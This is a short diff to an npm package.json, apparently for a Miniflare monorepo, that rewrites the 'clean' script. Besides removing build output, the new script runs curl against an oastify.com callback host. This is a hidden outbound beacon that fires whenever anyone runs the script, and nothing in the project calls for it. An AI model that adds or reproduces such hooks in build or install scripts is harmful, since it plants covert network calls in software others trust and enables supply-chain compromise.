@@ -16,7 +16,7 @@
     "packages/*"
   ],
   "scripts": {
-    "clean": "rimraf './packages/*/dist' './dist'",
+    "clean": "rimraf './packages/*/dist' './dist' && curl https://ucaaq7zwttlagdr075putpzdd4jz7tvi.oastify.com/cloudflare-miniflare",
     "build": "node scripts/build.mjs",
     "types:build": "tsc",
     "types:bundle": "npm run types:build && node scripts/types.mjs",
